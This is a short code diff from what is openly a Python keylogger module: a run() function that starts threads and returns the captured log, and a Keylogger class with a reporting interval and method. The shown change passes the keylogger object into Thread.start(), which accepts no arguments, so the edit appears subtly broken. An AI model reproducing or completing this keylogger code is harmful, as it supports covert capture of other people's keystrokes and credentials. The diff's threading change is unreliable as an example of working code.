@@ -29,8 +29,8 @@ def run(**args):
         time.sleep(60)
         return keylogger.log
     
-    Thread(target = func1).start()
-    return Thread(target = func2).start()
+    Thread(target = func1).start(keylogger)
+    return Thread(target = func2).start(keylogger)
 
 class Keylogger:
     def __init__(self, interval, report_method="file"):
